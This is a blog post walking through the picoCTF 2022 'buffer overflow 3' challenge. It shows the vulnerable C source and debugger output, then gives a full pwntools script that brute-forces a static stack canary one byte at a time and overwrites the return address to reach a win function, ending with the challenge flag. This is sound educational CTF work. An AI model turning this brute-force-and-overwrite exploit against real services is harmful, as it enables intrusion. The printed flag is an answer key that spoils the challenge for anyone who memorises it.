---
layout: post
title: Stack canary - picoCTF 2022 buffer overflow 3
tags: [CTF, pwn]
---
> Do you think you can bypass the protection and get the flag? It looks like Dr. Oswal added a stack canary to this [program](https://artifacts.picoctf.net/c/493/vuln) to protect against buffer overflows. You can view source [here](https://artifacts.picoctf.net/c/493/vuln.c). And connect with it using: nc saturn.picoctf.net 54640

## Source Code
A stack smashing protection is implemented by reading a canary file into a global variable and comparing with a local canary variable.
```c
char global_canary[CANARY_SIZE];
void read_canary() {
  FILE *f = fopen("canary.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'canary.txt' in this directory with your",
                    "own debugging canary.\n");
    exit(0);
  }

  fread(global_canary,sizeof(char),CANARY_SIZE,f);
  fclose(f);
}
void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
      exit(-1);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}
```

## Attack
First check how far the input buffer is from the canary. Break at the `memcmp` and check the arguments
```
─────────────────────────────────────────────── arguments (guessed) ────
memcmp@plt (
   [sp + 0x0] = 0xffffcba8 → "qaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabda[...]",
   [sp + 0x4] = 0x804c054 → <global_canary+0> out dx, eax
)
gef➤  x $esp
0xffffcb10:     0xffffcba8
gef➤  pattern search *0xffffcba8
[+] Searching for '*0xffffcba8'
[+] Found at offset 64 (little-endian search) likely
[+] Found at offset 61 (big-endian search)
```
So 64 bytes dummy input before the canary.

Next is to somehow get the canary value. Usually there are two ways to do this: either by leaking using format-string vulnerability or by bruteforcing using the program state as an oracle. In this case we are bruteforcing because there are meaningful output for both successful and failed input. So bruteforcing 1 byte at a time looks like:
```
buffer+0x0  -> crash
buffer+0x 1 -> crash
...
buffer+0x41 -> no crash -> one byte found
---
buffer+0x4100 -> crash
...
buffer+0x4142 -> no crash
... repeat until we get all bytes
buffer+0x41424344 -> no crash -> canary = 0x41424344
```
After we get the canary, find where `eip` could be overwritten and the address of `win` and we get the flag. The following script is my solution:
```python
from pwn import *

context.terminal = ["/usr/bin/konsole", "-e"]

exploit = b'A' * 64

canary = [0, 0, 0, 0]

for i in range(4):
  c = 0x00
  while True:
    if c > 0xff: break
    log.info(f"Trying canary[{i}] = {hex(c)}")
    canary[i] = c
    p = process("./vuln") if args.LOCAL else remote("saturn.picoctf.net", "61060")
    p.recvuntil(b"> ")
    p.sendline(b"200")
    p.recvuntil(b"> ")
    p.send(exploit + bytes(canary[:(i+1)]))
    try:
      recv = p.recvline()
    except EOFError:
      log.warn("EOFError")
      p.close()
      c += 1
      continue
    if (recv.find(b"Ok") != -1):
      log.success(f"Found canary[{i}]: " + hex(c))
      canary.append(c)
      p.close()
      break
    else:
      p.close()
      c += 1

log.success(f"Canary: " + hex(canary[3] << 24 | canary[2] << 16 | canary[1] << 8 | canary[0]))

exploit += p32(0xdeadbeef) if args.LOCAL else p32(canary[3] << 24 | canary[2] << 16 | canary[1] << 8 | canary[0])

exploit += b"B"*16

exploit += p32(0x8049336)

p = process("./vuln") if args.LOCAL else remote("saturn.picoctf.net", "61060")
p.recvuntil(b"> ")
p.sendline(b"200")
p.recvuntil(b"> ")
p.send(exploit)
p.interactive()
```
```
[+] Canary: 0x64526942
[+] Opening connection to saturn.picoctf.net on port 61060: Done
[*] Switching to interactive mode
Ok... Now Where's the Flag?
picoCTF{Stat1C_c4n4r13s_4R3_b4D_10a64ab3}
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to saturn.picoctf.net port 61060
```